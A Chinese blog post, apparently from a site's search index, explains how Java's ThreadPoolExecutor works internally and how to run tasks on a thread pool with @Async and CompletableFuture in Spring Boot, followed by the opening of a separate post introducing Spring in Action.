methods 钩子方法 ThreadPoolExecutor为提供了每个任务执行前后提供了钩子方法，重写beforeExecute(Thread，Runnable)和afterExecute(Runnable，Throwable)方法来操纵执行环境； 例如，重新初始化ThreadLocals，收集统计信息或记录日志等。此外，terminated()在Executor完全终止后需要完成后会被调用，可以重写此方法，以执行任殊处理。 注意：如果hook或回调方法抛出异常，内部的任务线程将会失败并结束。\n八、Queue maintenance 维护队列 getQueue()方法可以访问任务队列，一般用于监控和调试。绝不建议将这个方法用于其他目的。当在大量的队列任务被取消时，remove()和purge()方法可用于回收空间。\n九、Finalization 关闭\n如果程序中不在持有线程池的引用，并且线程池中没有线程时，线程池将会自动关闭。如果您希望确保即使用户忘记调用 shutdown()方法也可以回收未引用的线程池，使未使用线程最终死亡。那么必须通过设置适当的 keep-alive times 并设置allowCoreThreadTimeOut(boolean) 或者 使 corePoolSize下限为0 。 一般情况下，线程池启动后建议手动调用shutdown()关闭。\nThreadPoolExecutor使用 我们以最后一个构造方法（参数最多的那个），对其参数进行解释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  public ThreadPoolExecutor(int corePoolSize, // 1  int maximumPoolSize, // 2  long keepAliveTime, // 3  TimeUnit unit, // 4  BlockingQueue\u0026lt;Runnable\u0026gt; workQueue, // 5  ThreadFactory threadFactory, // 6  RejectedExecutionHandler handler ) { //7  if (corePoolSize \u0026lt; 0 || maximumPoolSize \u0026lt;= 0 || maximumPoolSize \u0026lt; corePoolSize || keepAliveTime \u0026lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; }      序号 名称 类型 含义     1 corePoolSize int 核心线程池大小   2 maximumPoolSize int 最大线程池大小   3 keepAliveTime long 线程最大空闲时间   4 unit TimeUnit 时间单位   5 workQueue BlockingQueue 线程等待队列   6 threadFactory ThreadFactory 线程创建工厂   7 handler RejectedExecutionHandler 拒绝策略    如果对这些参数作用有疑惑的请看 ThreadPoolExecutor概述。 知道了各个参数的作用后，我们开始构造符合我们期待的线程池。首先看JDK给我们预定义的几种线程池：\n一、预定义线程池  FixedThreadPool  1 2 3 4 5  public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;()); }     corePoolSize与maximumPoolSize相等，即其线程全为核心线程，是一个固定大小的线程池，是其优势； keepAliveTime = 0 该参数默认对核心线程无效，而FixedThreadPool全部为核心线程； workQueue 为LinkedBlockingQueue（无界阻塞队列），队列最大值为Integer.MAX_VALUE。如果任务提交速度持续大余任务处理速度，会造成队列大量阻塞。因为队列很大，很有可能在拒绝策略前，内存溢出。是其劣势； FixedThreadPool的任务执行是无序的；   适用场景：可用于Web服务瞬时削峰，但需注意长时间持续高峰情况造成的队列阻塞。\n CachedThreadPool  1 2 3 4 5  public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue\u0026lt;Runnable\u0026gt;()); }     corePoolSize = 0，maximumPoolSize = Integer.MAX_VALUE，即线程数量几乎无限制； keepAliveTime = 60s，线程空闲60s后自动结束。 workQueue 为 SynchronousQueue 同步队列，这个队列类似于一个接力棒，入队出队必须同时传递，因为CachedThreadPool线程创建无限制，不会有队列等待，所以使用SynchronousQueue；   适用场景：快速处理大量耗时较短的任务，如Netty的NIO接受请求时，可使用CachedThreadPool。\n SingleThreadExecutor  1 2 3 4 5 6  public static ExecutorService newSingleThreadExecutor() { return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;())); }   咋一瞅，不就是newFixedThreadPool(1)吗？定眼一看，这里多了一层FinalizableDelegatedExecutorService包装，这一层有什么用呢，写个dome来解释一下：\n1 2 3 4 5 6 7 8 9 10  public static void main(String[] args) { ExecutorService fixedExecutorService = Executors.newFixedThreadPool(1); ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) fixedExecutorService; System.out.println(threadPoolExecutor.getMaximumPoolSize()); threadPoolExecutor.setCorePoolSize(8); ExecutorService singleExecutorService = Executors.newSingleThreadExecutor(); // 运行时异常 java.lang.ClassCastException // ThreadPoolExecutor threadPoolExecutor2 = (ThreadPoolExecutor) singleExecutorService;  }   对比可以看出，FixedThreadPool可以向下转型为ThreadPoolExecutor，并对其线程池进行配置，而SingleThreadExecutor被包装后，无法成功向下转型。因此，SingleThreadExecutor被定以后，无法修改，做到了真正的Single。\n ScheduledThreadPool  1 2 3  public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) { return new ScheduledThreadPoolExecutor(corePoolSize); }   newScheduledThreadPool调用的是ScheduledThreadPoolExecutor的构造方法，而ScheduledThreadPoolExecutor继承了ThreadPoolExecutor，构造是还是调用了其父类的构造方法。\n1 2 3 4  public ScheduledThreadPoolExecutor(int corePoolSize) { super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS, new DelayedWorkQueue()); }   对于ScheduledThreadPool本文不做描述，其特性请关注后续篇章。详细参考附录。\n二、自定义线程池 以下是自定义线程池，使用了有界队列，自定义ThreadFactory和拒绝策略的demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87  import java.io.IOException; import java.util.concurrent.*; import java.util.concurrent.atomic.AtomicInteger; public class ThreadPoolTest { public static void main(String[] args) { int corePoolSize = 2; int maximumPoolSize = 4; long keepAliveTime = 10; TimeUnit unit = TimeUnit.SECONDS; // BlockingQueue\u0026lt;Runnable\u0026gt; workQueue = new ArrayBlockingQueue\u0026lt;\u0026gt;(2);  BlockingQueue\u0026lt;Runnable\u0026gt; workQueue = new LinkedBlockingQueue\u0026lt;\u0026gt;(2); ThreadFactory threadFactory = new NameThreadFactory(); RejectedExecutionHandler rejectedExecutionHandler = new MyIgnorePolicy(); ThreadPoolExecutor tpexecutor = new ThreadPoolExecutor(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, rejectedExecutionHandler); // 预启动所有核心线程  tpexecutor.prestartAllCoreThreads(); for (int i = 1; i \u0026lt;= 10; i++) { MyTask myTask = new MyTask(String.valueOf(i)); tpexecutor.execute(myTask); } try { //阻塞主线程  System.in.read(); } catch (IOException e) { e.printStackTrace(); } } static class NameThreadFactory implements ThreadFactory { private final AtomicInteger mThreadNum = new AtomicInteger(1); @Override public Thread newThread(Runnable r) { Thread t = new Thread(r, \u0026#34;my-thread-\u0026#34; + mThreadNum.getAndIncrement()); System.out.println(t.getName() + \u0026#34; has been created\u0026#34;); return t; } } public static class MyIgnorePolicy implements RejectedExecutionHandler { @Override public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) { doLog(r, executor); } private void doLog(Runnable r, ThreadPoolExecutor executor) { System.err.println(r.toString() + \u0026#34; rejected\u0026#34;); System.out.println(\u0026#34;getCompletedTaskCount: \u0026#34; + executor.getCompletedTaskCount()); } } public static class MyTask implements Runnable { private String name; public MyTask(String name) { this.name = name; } @Override public void run() { try { System.out.println(this.toString() + \u0026#34;is running!\u0026#34;); //让任务执行慢点  Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } public String getName() { return name; } public String toString() { return \u0026#34;MyTask [name=\u0026#34; + name + \u0026#34;]\u0026#34;; } } }   输出结果如下：\n my-thread-1 has been created my-thread-2 has been created my-thread-3 has been created MyTask [name=2]is running! MyTask [name=1]is running! my-thread-4 has been created MyTask [name=3]is running! MyTask [name=6]is running! getCompletedTaskCount: 0 getCompletedTaskCount: 0 getCompletedTaskCount: 0 getCompletedTaskCount: 0 MyTask [name=7] rejected MyTask [name=8] rejected MyTask [name=9] rejected MyTask [name=10] rejected MyTask [name=4]is running! MyTask [name=5]is running!\n 其中线程线程1-4先占满了核心线程和最大线程数量[4]，然后4、5线程进入等待队列[队列大小为4]，7-10线程被直接忽略拒绝执行，等1-4线程中有线程执行完后通知4、5线程继续执行。\n说明：自定义线程池参数可以根据具体业务场景配置。\nThreadPoolExecutor状态控制 读懂ThreadPoolExecutor执行原理，需要先掌握其状态控制的方式，因为使用了大量位运算，读起来有点吃力，所以单独用一篇文章分析。以下是ThreadPoolExecutor状态控制的主要变量和方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //原子状态控制数  private final AtomicInteger ctl = new AtomicInteger(ctlOf(RUNNING, 0)); //29比特位  private static final int COUNT_BITS = Integer.SIZE - 3; //实际容量 2^29-1  private static final int CAPACITY = (1 \u0026lt;\u0026lt; COUNT_BITS) - 1; // runState is stored in the high-order bits  // runState存储在高位中  private static final int RUNNING = -1 \u0026lt;\u0026lt; COUNT_BITS; private static final int SHUTDOWN = 0 \u0026lt;\u0026lt; COUNT_BITS; private static final int STOP = 1 \u0026lt;\u0026lt; COUNT_BITS; private static final int TIDYING = 2 \u0026lt;\u0026lt; COUNT_BITS; private static final int TERMINATED = 3 \u0026lt;\u0026lt; COUNT_BITS; // Packing and unpacking ctl 打包和解压ctl  // 解压runState  private static int runStateOf(int c) { return c \u0026amp; ~CAPACITY; } // 解压workerCount  private static int workerCountOf(int c) { return c \u0026amp; CAPACITY; } // 打包ctl  private static int ctlOf(int rs, int wc) { return rs | wc; }   线程池使用一个AtomicInteger的ctl变量将 workerCount（工作线程数量）和 runState（运行状态）两个字段压缩在一起 ，这种做法在在java源码里经常有出现，如在 ReentrantReadWriteLock 里就将一个int分成高16位和底16位，分别表示读锁状态和写锁状态。ThreadPoolExecutor里也是使用了同样的思想，表现得更加复杂。\nThreadPoolExecutor用3个比特位表示runState， 29个比特位表示workerCount。因此这里需要特别说明的是：\n 确切的说，当最大线程数量配置为Integer.MXA_VAULE时，ThreadPoolExecutor的线程最大数量依然是2^29-1。\n 目前来看这是完全够用的，但随着计算机的不断发展，真的到了不够用的时候可以改变为AtomicLong。这如同32位系统时间戳会在2038年01月19日03时14分07秒耗尽一样，当以后我们的系统线程能够超过2^29-1时，这些代码就需要调整了。对于未来，无限可能。\n思考一下为什么是29：3呢？ 这是因为我们的运营状态有5种，向上取2次方数，2^3 = 8。所以必须要3个比特位来表示各种状态。\n运行状态解释：\n   状态 解释     RUNNING 运行态，可处理新任务并执行队列中的任务   SHUTDOW 关闭态，不接受新任务，但处理队列中的任务   STOP 停止态，不接受新任务，不处理队列中任务，且打断运行中任务   TIDYING 整理态，所有任务已经结束，workerCount = 0 ，将执行terminated()方法   TERMINATED 结束态，terminated() 方法已完成    整个ctl的状态，会在线程池的不同运行阶段进行CAS转换。\nThreadPoolExecutor执行原理 execute() 分析ThreadPoolExecutor的执行原理，直接从execute方法开始\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  public void execute(Runnable command) { if (command == null) throw new NullPointerException(); int c = ctl.get(); // 1、工作线程 \u0026lt; 核心线程  if (workerCountOf(c) \u0026lt; corePoolSize) { if (addWorker(command, true)) return; c = ctl.get(); } // 2、运行态，并尝试将任务加入队列  if (isRunning(c) \u0026amp;\u0026amp; workQueue.offer(command)) { int recheck = ctl.get(); if (! isRunning(recheck) \u0026amp;\u0026amp; remove(command)) reject(command); else if (workerCountOf(recheck) == 0) addWorker(null, false); } // 3、使用尝试使用最大线程运行  else if (!addWorker(command, false)) reject(command); }   这三处if判断，还是比较泛的，整体大框框上的流程，可用下图表示。\n在execute方法中，用到了double-check的思想，我们看到上述代码中并没有同步控制，都是基于乐观的check，如果任务可以创建则进入addWorker(Runnable firstTask, boolean core)方法，注意上述代码中的三种传参方式：\n  addWorker(command, true)： 创建核心线程执行任务； addWorker(command, false)：创建非核心线程执行任务； addWorker(null, false)： 创建非核心线程，当前任务为空；   addWorker的返回值是boolean，不保证操作成功。下面详看addWorker方法（代码稍微有点长）：\naddWorker() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  private boolean addWorker(Runnable firstTask, boolean core) { // 第一部分：自旋、CAS、重读ctl 等结合，直到确定是否可以创建worker，  // 可以则跳出循环继续操作，否则返回false  retry: for (;;) { int c = ctl.get(); int rs = runStateOf(c); // Check if queue empty only if necessary.  if (rs \u0026gt;= SHUTDOWN \u0026amp;\u0026amp; ! (rs == SHUTDOWN \u0026amp;\u0026amp; firstTask == null \u0026amp;\u0026amp; ! workQueue.isEmpty())) return false; for (;;) { int wc = workerCountOf(c); if (wc \u0026gt;= CAPACITY || wc \u0026gt;= (core ? corePoolSize : maximumPoolSize)) return false; if (compareAndIncrementWorkerCount(c)) // CAS增长workerCount，成功则跳出循环  break retry; c = ctl.get(); // Re-read ctl 重新获取ctl  if (runStateOf(c) != rs) // 状态改变则继续外层循环，否则在内层循环  continue retry; // else CAS failed due to workerCount change; retry inner loop  } } // 第二部分：创建worker，这部分使用ReentrantLock锁  boolean workerStarted = false; // 线程启动标志位  boolean workerAdded = false; // 线程是否加入workers 标志位  Worker w = null; try { w = new Worker(firstTask); //创建worker  final Thread t = w.thread; if (t != null) { final ReentrantLock mainLock = this.mainLock; mainLock.lock(); try { // 获取到锁以后仍需检查ctl，可能在上一个获取到锁处理的线程可能会改变runState  // 如 ThreadFactory 创建失败 或线程池被 shut down等  int rs = runStateOf(ctl.get()); if (rs \u0026lt; SHUTDOWN || (rs == SHUTDOWN \u0026amp;\u0026amp; firstTask == null)) { if (t.isAlive()) throw new IllegalThreadStateException(); workers.add(w); int s = workers.size(); if (s \u0026gt; largestPoolSize) largestPoolSize = s; workerAdded = true; } } finally { mainLock.unlock(); } if (workerAdded) { t.start(); // 启动线程  workerStarted = true; } } } finally { if (! workerStarted) addWorkerFailed(w); // 失败操作  } return workerStarted; }   addWorker的工作可分为两个部分：\n  第一部分：原子操作，判断是否可以创建worker。通过自旋、CAS、ctl 等操作，判断继续创建还是返回false，自旋周期一般很短。 第二部分：同步创建workder，并启动线程。   Class Worker 第一部分思路理清楚，就可以理解了。下面详解第二部分的Worker：\nWorker是ThreadPoolExecutor的内部类，实现了 AbstractQueuedSynchronizer 并继承了 Runnable。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58  private final class Worker extends AbstractQueuedSynchronizer implements Runnable { private static final long serialVersionUID = 6138294804551838833L; /** 每个worker有自己的内部线程，ThreadFactory创建失败时是null */ final Thread thread; /** 初始化任务，可能是null */ Runnable firstTask; /** 每个worker的完成任务数 */ volatile long completedTasks; Worker(Runnable firstTask) { setState(-1); // 禁止线程在启动前被打断  this.firstTask = firstTask; this.thread = getThreadFactory().newThread(this); } /** 重要的执行方法 */ public void run() { runWorker(this); } // state = 0 代表未锁；state = 1 代表已锁  protected boolean isHeldExclusively() { return getState() != 0; } protected boolean tryAcquire(int unused) { if (compareAndSetState(0, 1)) { setExclusiveOwnerThread(Thread.currentThread()); return true; } return false; } protected boolean tryRelease(int unused) { setExclusiveOwnerThread(null); setState(0); return true; } public void lock() { acquire(1); } public boolean tryLock() { return tryAcquire(1); } public void unlock() { release(1); } public boolean isLocked() { return isHeldExclusively(); } // interrupt已启动线程  void interruptIfStarted() { Thread t; // 初始化是 state = -1，不会被interrupt  if (getState() \u0026gt;= 0 \u0026amp;\u0026amp; (t = thread) != null \u0026amp;\u0026amp; !t.isInterrupted()) { try { t.interrupt(); } catch (SecurityException ignore) { } } } }   Worker 实现了简单的 非重入互斥锁，互斥容易理解，非重入是为了避免线程池的一些控制方法获得重入锁，比如setCorePoolSize操作。注意 Worker 实现锁的目的与传统锁的意义不太一样。其主要是为了控制线程是否可interrupt，以及其他的监控，如线程是否 active（正在执行任务）。\n 线程池里线程是否处于运行状态与普通线程不一样，普通线程可以调用 Thread.currentThread().isAlive() 方法来判断，而线程池，在run方法中可能在等待获取新任务，这期间线程线程是 alive 但是却不是 active。\n runWorker代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  final void runWorker(Worker w) { Thread wt = Thread.currentThread(); Runnable task = w.firstTask; w.firstTask = null; w.unlock(); // 允许被 interrupt  boolean completedAbruptly = true; try { // loop 直至 task = null （线程池关闭、超时等）  // 注意这里的getTask()方法，我们配置的阻塞队列会在这里起作用  while (task != null || (task = getTask()) != null) { w.lock(); // 执行任务前上锁  // 如果线程池停止，确保线程中断; 如果没有，确保线程不中断。这需要在第二种情况下进行重新获取ctl，以便在清除中断时处理shutdownNow竞争  if ((runStateAtLeast(ctl.get(), STOP) || (Thread.interrupted() \u0026amp;\u0026amp; runStateAtLeast(ctl.get(), STOP))) \u0026amp;\u0026amp; !wt.isInterrupted()) wt.interrupt(); try { beforeExecute(wt, task); // 扩展点  Throwable thrown = null; try { task.run(); // 真正执行run方法  } catch (RuntimeException x) { thrown = x; throw x; } catch (Error x) { thrown = x; throw x; } catch (Throwable x) { thrown = x; throw new Error(x); } finally { afterExecute(task, thrown); // 扩展点  } } finally { task = null; w.completedTasks++; w.unlock(); } } completedAbruptly = false; } finally { processWorkerExit(w, completedAbruptly); // 线程退出工作  } }   runWorker的主要任务就是一直loop循环，来一个任务处理一个任务，没有任务就去getTask()，getTask()可能会阻塞，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  private Runnable getTask() { boolean timedOut = false; // 上一次 poll() 是否超时  for (;;) { int c = ctl.get(); int rs = runStateOf(c); // 是否继续处理任务 可以参见上一篇的状态控制  if (rs \u0026gt;= SHUTDOWN \u0026amp;\u0026amp; (rs \u0026gt;= STOP || workQueue.isEmpty())) { decrementWorkerCount(); return null; } int wc = workerCountOf(c); // 是否允许超时  boolean timed = allowCoreThreadTimeOut || wc \u0026gt; corePoolSize; if ((wc \u0026gt; maximumPoolSize || (timed \u0026amp;\u0026amp; timedOut)) \u0026amp;\u0026amp; (wc \u0026gt; 1 || workQueue.isEmpty())) { if (compareAndDecrementWorkerCount(c)) return null; continue; } try { Runnable r = timed ? workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) : workQueue.take(); if (r != null) return r; timedOut = true; } catch (InterruptedException retry) { timedOut = false; } } }   getTask()方法里面主要用我们配置的workQueue来工作，其阻塞原理与超时原理基于阻塞队列实现，这里不做详解。\n总结，ThreadPoolExecutor的执行主要围绕Worker，Worker 实现了 AbstractQueuedSynchronizer 并继承了 Runnable，其对锁的妙运用，值得思考。\nScheduledThreadPoolExecutor 参考如下：\n线程池之ScheduledThreadPoolExecutor概述 线程池之ScheduledThreadPoolExecutor调度原理\n Springboot 多线程 在Springboot中对其进行了简化处理，只需要配置一个类型为java.util.concurrent.TaskExecutor或其子类的bean，并在配置类或直接在程序入口类上声明注解@EnableAsync。\n调用也简单，在由Spring管理的对象的方法上标注注解@Async，显式调用即可生效。\n一般使用Spring提供的ThreadPoolTaskExecutor类。\n配置实例快速使用 SpringBoot应用中需要添加@EnableAsync注解，来开启异步调用，一般还会配置一个线程池，异步的方法交给特定的线程池完成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  @Configuration @EnableAsync public class AsyncConfiguration { @Bean(\u0026#34;doSomethingExecutor\u0026#34;) public Executor doSomethingExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); // 核心线程数：线程池创建时候初始化的线程数  executor.setCorePoolSize(10); // 最大线程数：线程池最大的线程数，只有在缓冲队列满了之后才会申请超过核心线程数的线程  executor.setMaxPoolSize(20); // 缓冲队列：用来缓冲执行任务的队列  executor.setQueueCapacity(500); // 允许线程的空闲时间60秒：当超过了核心线程之外的线程在空闲时间到达之后会被销毁  executor.setKeepAliveSeconds(60); // 线程池名的前缀：设置好了之后可以方便我们定位处理任务所在的线程池  executor.setThreadNamePrefix(\u0026#34;do-something-\u0026#34;); // 缓冲队列满了之后的拒绝策略：由调用线程处理（一般是主线程）  executor.setRejectedExecutionHandler(new ThreadPoolExecutor.DiscardPolicy()); executor.initialize(); return executor; } }   使用的方式非常简单，在需要异步的方法上加@Async注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  @RestController public class AsyncController { @Autowired private AsyncService asyncService; @GetMapping(\u0026#34;/open/something\u0026#34;) public String something() { int count = 10; for (int i = 0; i \u0026lt; count; i++) { asyncService.doSomething(\u0026#34;index = \u0026#34; + i); } lon return \u0026#34;success\u0026#34;; } } @Slf4j @Service public class AsyncService { // 指定使用beanname为doSomethingExecutor的线程池  @Async(\u0026#34;doSomethingExecutor\u0026#34;) public String doSomething(String message) { log.info(\u0026#34;do something, message={}\u0026#34;, message); try { Thread.sleep(1000); } catch (InterruptedException e) { log.error(\u0026#34;do something error: \u0026#34;, e); } return message; } }   访问：127.0.0.1:8080/open/something，日志如下\n1 2 3 4 5 6 7 8 9 10 11  2020-04-19 23:42:42.486 INFO 21168 --- [io-8200-exec-17] x.g.b.system.controller.AsyncController : do something end, time 8 milliseconds 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-1] x.gits.boot.system.service.AsyncService : do something, message=index = 0 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-5] x.gits.boot.system.service.AsyncService : do something, message=index = 4 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-4] x.gits.boot.system.service.AsyncService : do something, message=index = 3 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-6] x.gits.boot.system.service.AsyncService : do something, message=index = 5 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-9] x.gits.boot.system.service.AsyncService : do something, message=index = 8 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-8] x.gits.boot.system.service.AsyncService : do something, message=index = 7 2020-04-19 23:42:42.488 INFO 21168 --- [do-something-10] x.gits.boot.system.service.AsyncService : do something, message=index = 9 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-7] x.gits.boot.system.service.AsyncService : do something, message=index = 6 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-2] x.gits.boot.system.service.AsyncService : do something, message=index = 1 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-3] x.gits.boot.system.service.AsyncService : do something, message=index = 2   由此可见已经达到异步执行的效果了，并且使用到了咱们配置的线程池。\n获取异步方法返回值 当异步方法有返回值时，如何获取异步方法执行的返回结果呢？这时需要异步调用的方法带有返回值CompletableFuture。\nCompletableFuture是对Feature的增强，Feature只能处理简单的异步任务，而CompletableFuture可以将多个异步任务进行复杂的组合。如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  @RestController public class AsyncController { @Autowired private AsyncService asyncService; @SneakyThrows @ApiOperation(\u0026#34;异步 有返回值\u0026#34;) @GetMapping(\u0026#34;/open/somethings\u0026#34;) public String somethings() { CompletableFuture\u0026lt;String\u0026gt; createOrder = asyncService.doSomething1(\u0026#34;create order\u0026#34;); CompletableFuture\u0026lt;String\u0026gt; reduceAccount = asyncService.doSomething2(\u0026#34;reduce account\u0026#34;); CompletableFuture\u0026lt;String\u0026gt; saveLog = asyncService.doSomething3(\u0026#34;save log\u0026#34;); // 等待所有任务都执行完  CompletableFuture.allOf(createOrder, reduceAccount, saveLog).join(); // 获取每个任务的返回结果  String result = createOrder.get() + reduceAccount.get() + saveLog.get(); return result; } } @Slf4j @Service public class AsyncService { @Async(\u0026#34;doSomethingExecutor\u0026#34;) public CompletableFuture\u0026lt;String\u0026gt; doSomething1(String message) throws InterruptedException { log.info(\u0026#34;do something1: {}\u0026#34;, message); Thread.sleep(1000); return CompletableFuture.completedFuture(\u0026#34;do something1: \u0026#34; + message); } @Async(\u0026#34;doSomethingExecutor\u0026#34;) public CompletableFuture\u0026lt;String\u0026gt; doSomething2(String message) throws InterruptedException { log.info(\u0026#34;do something2: {}\u0026#34;, message); Thread.sleep(1000); return CompletableFuture.completedFuture(\u0026#34;; do something2: \u0026#34; + message); } @Async(\u0026#34;doSomethingExecutor\u0026#34;) public CompletableFuture\u0026lt;String\u0026gt; doSomething3(String message) throws InterruptedException { log.info(\u0026#34;do something3: {}\u0026#34;, message); Thread.sleep(1000); return CompletableFuture.completedFuture(\u0026#34;; do something3: \u0026#34; + message); } }   访问接口\n1 2  C:\\Users\\Administrator\u0026gt;curl -X GET \u0026#34;http://localhost:8200/open/somethings\u0026#34; -H \u0026#34;accept: */*\u0026#34; do something1: create order; do something2: reduce account; do something3: save log   控制台上关键日志如下：\n1 2 3  2020-04-20 00:27:42.238 INFO 5672 --- [ do-something-3] x.gits.boot.system.service.AsyncService : do something3: save log 2020-04-20 00:27:42.238 INFO 5672 --- [ do-something-2] x.gits.boot.system.service.AsyncService : do something2: reduce account 2020-04-20 00:27:42.238 INFO 5672 --- [ do-something-1] x.gits.boot.system.service.AsyncService : do something1: create order   以上多线程之间并无执行和完成先后顺序\n注意事项 @Async注解会在以下几个场景失效，也就是说明明使用了@Async注解，但就没有走多线程。\n 异步方法使用static关键词修饰； 异步类不是一个Spring容器的bean（一般使用注解@Component和@Service，并且能被Spring扫描到）； SpringBoot应用中没有添加@EnableAsync注解； 在同一个类中，一个方法调用另外一个有@Async注解的方法，注解不会生效。原因是@Async注解的方法，是在代理类中执行的。  需要注意的是： 异步方法使用注解@Async的返回值只能为void或者Future及其子类，当返回结果为其他类型时，方法还是会异步执行，但是返回值都是null\n附录 线程启动原理\n线程中断机制\n多线程实现方式\nFutureTask实现原理\n线程池之ThreadPoolExecutor概述\n线程池之ThreadPoolExecutor使用\n线程池之ThreadPoolExecutor状态控制\n线程池之ThreadPoolExecutor执行原理\n线程池之ScheduledThreadPoolExecutor概述\n线程池之ScheduledThreadPoolExecutor调度原理\n线程池的优雅关闭实践\nSpringBoot中如何优雅的使用多线程\nJava多线程看这一篇就足够了（吐血超详细总结）\n","permalink":"http://bingerambo.com/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/","tags":["Java"],"title":"Java和Springboot中的多线程"},{"categories":["Java"],"contents":"Spring实战电子书和源码\n📚Spring 实战(第 5 版) GitBook \n📚Spring 实战(第 5 版) 源码 \n1.1 什么是 Spring？ 我知道你可能很想开始编写 Spring 应用程序，我向你保证，在本章结束之前，你将开发一个简单的应用程序。但是首先，我得介绍一些 Spring 的基本概念，以帮助你了解 Spring 的变化。\n任何不平凡的应用程序都由许多组件组成，每个组件负责自己的在整体应用程序中的那部分功能，并与其他应用程序元素协调以完成工作。在运行应用程序时，需要以某种方式创建这些组件并相互引用。\nSpring 的核心是一个 容器，通常称为 Spring 应用程序上下文，用于创建和管理应用程序组件。这些组件（或 bean）在 Spring 应用程序上下文中连接在一起以构成一个完整的应用程序，就像将砖、灰浆、木材、钉子、管道和电线绑在一起以组成房屋。\n将 bean 连接在一起的行为是基于一种称为 依赖注入（DI）的模式。依赖项注入的应用程序不是由组件自身创建和维护它们依赖的其他 bean 的生命周期，而是依赖于单独的实体（容器）来创建和维护所有组件，并将这些组件注入需要它们的 bean。通常通过构造函数参数或属性访问器方法完成此操作。\n例如，假设在应用程序的许多组件中，要处理两个组件：inventory service（用于获取库存级别）和 product service（用于提供基本产品信息）。product service 取决于 inventory service，以便能够提供有关产品的完整信息。图 1.1 说明了这些 bean 与 Spring 应用程序上下文之间的关系。\n除了其核心容器之外，Spring 和完整的相关库产品组合还提供 Web 框架、各种数据持久性选项、安全框架与其他系统的集成、运行时监视、微服务支持、响应式编程模型以及许多其他功能，应用于现代应用程序开发。\n从历史上看，引导 Spring 应用程序上下文将 bean 连接在一起的方式是使用一个或多个 XML 文件，这些文件描述了组件及其与其他组件的关系。例如，以下 XML 声明两个 bean，一个 InventoryService bean 和一个 ProductService bean，然后通过构造函数参数将 InventoryService bean 注入到 ProductService 中：\n图 1.1 通过 Spring 上下文管理应用组件和注入\n1 2 3 4  \u0026lt;bean id=\u0026#34;inventoryService\u0026#34; class=\u0026#34;com.example.InventoryService\u0026#34; /\u0026gt; \u0026lt;bean id=\u0026#34;productService\u0026#34; class=\u0026#34;com.example.ProductService\u0026#34; \u0026gt; \u0026lt;constructor-arg ref=\u0026#34;inventoryService\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt;   但是，在最新版本的 Spring 中，基于 Java 的配置更为常见。以下基于 Java 的配置类等效于 XML 配置：\n1 2 3 4 5 6 7 8 9 10 11 12  @Configuration public class ServiceConfiguration { @Bean public InventoryService inventoryService() { return new InventoryService(); } @Bean public ProductService productService() { return new ProductService(inventoryService()); } }   @Configuration 注释向 Spring 表明这是一个配置类，它将为 Spring 应用程序上下文提供 beans。 配置的类方法带有 @Bean 注释，指示它们返回的对象应作为 beans 添加到应用程序上下文中（默认情况下，它们各自的 bean IDs 